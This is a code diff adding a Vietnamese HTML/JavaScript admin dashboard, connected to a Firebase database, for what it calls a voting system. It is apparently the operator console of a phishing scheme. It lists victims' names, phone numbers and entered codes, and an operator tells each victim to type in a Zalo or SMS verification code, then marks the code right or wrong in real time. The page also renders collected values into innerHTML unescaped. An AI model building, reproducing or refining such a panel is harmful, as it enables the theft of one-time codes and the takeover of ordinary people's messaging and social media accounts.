@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quản Trị Người Dùng FB</title>
+    <style>
+        /* Sử dụng font Serif (Times New Roman) theo yêu cầu */
+        body { 
+            font-family: 'Times New Roman', Times, serif; 
+            margin: 0; 
+            background-color: #f4f6f9; 
+            color: #2c3e50;
+            line-height: 1.6;
+        }
+
+        /* Container chính */
+        .dashboard { 
+            padding: 30px 20px; 
+            max-width: 1200px; 
+            margin: 0 auto; 
+        }
+        
+        /* Header */
+        .header-dash { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            background: #ffffff; 
+            padding: 20px 25px; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08); 
+            margin-bottom: 25px; 
+            border-top: 5px solid #1877f2; /* Viền trên tạo điểm nhấn */
+        }
+        .header-dash h2 { 
+            margin: 0; 
+            color: #1877f2; 
+            font-size: 26px; 
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Nút Xóa toàn bộ */
+        .btn-clear-all { 
+            background: #e74c3c; 
+            color: white; 
+            padding: 10px 20px; 
+            border: none; 
+            border-radius: 6px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            font-size: 15px; 
+            font-family: inherit;
+            transition: background 0.3s;
+            text-transform: uppercase;
+        }
+        .btn-clear-all:hover { background: #c0392b; }
+        
+        /* Box chứa bảng */
+        .card { 
+            background: #ffffff; 
+            border-radius: 8px; 
+            padding: 25px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05); 
+            overflow-x: auto;
+        }
+        
+        /* Table Styles */
+        table { 
+            width: 100%; 
+            border-collapse: collapse; 
+            min-width: 900px; 
+        }
+        th, td { 
+            padding: 16px 15px; 
+            border-bottom: 1px solid #eaeded; 
+            text-align: left; 
+            vertical-align: middle;
+            font-size: 16px;
+        }
+        th { 
+            background-color: #f8f9fa; 
+            color: #34495e; 
+            font-weight: bold; 
+            font-size: 15px; 
+            text-transform: uppercase; 
+            letter-spacing: 0.5px;
+            border-bottom: 2px solid #bdc3c7;
+        }
+        tr:hover { background-color: #fdfefe; }
+        
+        /* Buttons Điều Khiển (Duyệt/Từ chối) */
+        .btn-action { 
+            padding: 8px 12px; 
+            border: none; 
+            border-radius: 5px; 
+            color: white; 
+            cursor: pointer; 
+            font-weight: bold; 
+            font-size: 14px; 
+            margin-bottom: 6px; 
+            width: 100%; 
+            transition: opacity 0.2s;
+            font-family: inherit;
+            box-sizing: border-box;
+        }
+        .btn-action:hover { opacity: 0.85; }
+        .btn-zalo { background: #0068ff; } 
+        .btn-sms { background: #e67e22; } 
+        .btn-success { background: #27ae60; }
+        .btn-reject { background: #95a5a6; color: #fff;}
+        .btn-reject-red { background: #e74c3c; color: #fff;}
+        
+        /* Nút Xóa Dòng Riêng Lẻ */
+        .btn-delete-row {
+            background: transparent;
+            color: #e74c3c;
+            border: 1px solid #e74c3c;
+            padding: 6px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 13px;
+            font-family: inherit;
+            font-weight: bold;
+            transition: all 0.2s;
+        }
+        .btn-delete-row:hover {
+            background: #e74c3c;
+            color: white;
+        }
+
+        /* Trạng Thái Badges */
+        .badge { 
+            padding: 6px 12px; 
+            border-radius: 4px; 
+            font-size: 14px; 
+            font-weight: bold; 
+            display: inline-block;
+            font-style: italic;
+        }
+        .bg-warning { background: #fef9e7; color: #d35400; border: 1px solid #f8c471;}
+        .bg-info { background: #ebf5fb; color: #2980b9; border: 1px solid #85c1e9;}
+        .bg-success { background: #eafaf1; color: #27ae60; border: 1px solid #82e0aa;}
+        .bg-danger { background: #fdedec; color: #c0392b; border: 1px solid #f1948a;}
+        
+        /* Thông tin Cột */
+        .info-cell { display: flex; flex-direction: column; gap: 4px;}
+        .info-name { font-weight: bold; font-size: 17px; color: #2c3e50; }
+        .info-phone { color: #16a085; font-weight: bold; font-size: 16px;}
+        
+        /* Khung Code */
+        .code-box { 
+            font-size: 22px; 
+            font-weight: bold; 
+            color: #c0392b; 
+            letter-spacing: 3px; 
+            background: #fdedec; 
+            padding: 6px 12px; 
+            border-radius: 6px; 
+            display: inline-block;
+            border: 1px dashed #e74c3c;
+        }
+
+        /* Message khi không có dữ liệu */
+        .empty-msg {
+            text-align: center;
+            padding: 40px;
+            color: #7f8c8d;
+            font-size: 18px;
+            font-style: italic;
+        }
+    </style>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body>
+
+    <div class="dashboard">
+        <div class="header-dash">
+            <h2>Hệ Thống Quản Trị Bình Chọn</h2>
+            <button class="btn-clear-all" onclick="clearData()">Xóa tất cả dữ liệu</button>
+        </div>
+        
+        <div class="card">
+            <table>
+                <thead>
+                    <tr>
+                        <th style="width: 20%;">Thông Tin Khách</th>
+                        <th style="width: 15%;">Mã Code</th>
+                        <th style="width: 20%;">Trạng Thái</th>
+                        <th style="width: 25%;">Bảng Điều Khiển</th>
+                        <th style="width: 10%;">Thời Gian</th>
+                        <th style="width: 10%; text-align: center;">Hành Động</th>
+                    </tr>
+                </thead>
+                <tbody id="dataTableBody">
+                    </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        // Cấu hình Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyDk5okwiZEg2KOEwjUf1DHiTIFqNypq-So",
+            authDomain: "conhi-vote.firebaseapp.com",
+            databaseURL: "https://conhi-vote-default-rtdb.firebaseio.com",
+            projectId: "conhi-vote",
+            storageBucket: "conhi-vote.firebasestorage.app",
+            messagingSenderId: "953203459869",
+            appId: "1:953203459869:web:da5710aa4b115b5bbf83f4"
+        };
+        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+        const db = firebase.database();
+
+        // Hàm cập nhật trạng thái
+        function setStatus(id, newStatus) {
+            db.ref('DatabaseAdmin/' + id).update({ status: newStatus });
+        }
+
+        // Hàm xóa từng dòng dữ liệu
+        function deleteRow(id) {
+            if(confirm("Bạn có chắc chắn muốn xóa bản ghi này?")) {
+                db.ref('DatabaseAdmin/' + id).remove()
+                    .then(() => console.log("Đã xóa bản ghi: " + id))
+                    .catch((error) => alert("Lỗi xóa: " + error.message));
+            }
+        }
+
+        // Lắng nghe dữ liệu realtime
+        db.ref('DatabaseAdmin').on('value', (snapshot) => {
+            const tbody = document.getElementById('dataTableBody');
+            tbody.innerHTML = ''; 
+            const data = snapshot.val();
+            
+            if(!data) {
+                tbody.innerHTML = '<tr><td colspan="6" class="empty-msg">Chưa có dữ liệu bình chọn nào.</td></tr>';
+                return;
+            }
+
+            Object.entries(data).reverse().forEach(([key, vote]) => {
+                const tr = document.createElement('tr');
+                
+                let codeDisplay = vote.code ? `<div class="code-box">${vote.code}</div>` : `<span style="color:#bdc3c7; font-style:italic;">Đang chờ nhập...</span>`;
+                let statusBadge = "";
+                let actionHtml = "";
+                
+                if (vote.status === "step1_pending") {
+                    statusBadge = `<span class="badge bg-warning">Chờ duyệt Tên/SĐT</span>`;
+                    actionHtml = `
+                        <button class="btn-action btn-zalo" onclick='setStatus("${key}", "zalo_requested")'>Báo gửi Zalo</button>
+                        <button class="btn-action btn-sms" onclick='setStatus("${key}", "sms_requested")'>Báo gửi SMS</button>
+                        <button class="btn-action btn-reject" onclick='setStatus("${key}", "step1_rejected")'>Báo sai Tên/SĐT</button>
+                    `;
+                } 
+                else if (vote.status === "zalo_requested" || vote.status === "sms_requested") {
+                    let txt = vote.status === "zalo_requested" ? "Zalo" : "SMS";
+                    statusBadge = `<span class="badge bg-info">Đang chờ nhập mã (${txt})</span>`;
+                    actionHtml = `<div style="color:#7f8c8d; font-size:14px; text-align:center; font-style:italic;">Khách đang thao tác...</div>`;
+                } 
+                else if (vote.status === "code_submitted") {
+                    statusBadge = `<span class="badge bg-warning" style="background:#fcf3cf; color:#d68910;">Khách đã nhập mã!</span>`;
+                    actionHtml = `
+                        <button class="btn-action btn-success" onclick='setStatus("${key}", "completed")'>Mã ĐÚNG - Duyệt</button>
+                        <button class="btn-action btn-reject-red" onclick='setStatus("${key}", "code_rejected")'>Mã SAI - Yêu cầu nhập lại</button>
+                    `;
+                } 
+                else if (vote.status === "completed") {
+                    statusBadge = `<span class="badge bg-success">Hoàn tất bình chọn ✓</span>`;
+                } 
+                else if (vote.status === "step1_rejected") {
+                    statusBadge = `<span class="badge bg-danger">Đã từ chối SĐT</span>`;
+                }
+
+                // Dùng nháy kép cho thuộc tính HTML để VS Code không bị lỗi highlight
+                tr.innerHTML = `
+                    <td>
+                        <div class="info-cell">
+                            <span class="info-name">${vote.name || '---'}</span>
+                            <span class="info-phone">${vote.phone}</span>
+                        </div>
+                    </td>
+                    <td>${codeDisplay}</td>
+                    <td>${statusBadge}</td>
+                    <td>${actionHtml}</td>
+                    <td style="color:#7f8c8d; font-size:14px;">${vote.time}</td>
+                    <td style="text-align: center;">
+                        <button class="btn-delete-row" onclick='deleteRow("${key}")'>Xóa</button>
+                    </td>
+                `;
+                tbody.appendChild(tr);
+            });
+        });
+
+        // Xóa toàn bộ dữ liệu
+        function clearData() {
+            if(confirm("CẢNH BÁO: Bạn có chắc chắn muốn xóa sạch TOÀN BỘ dữ liệu không? Hành động này không thể hoàn tác!")) {
+                db.ref('DatabaseAdmin').remove();
+            }
+        }
+    </script>
+</body>
+</html>
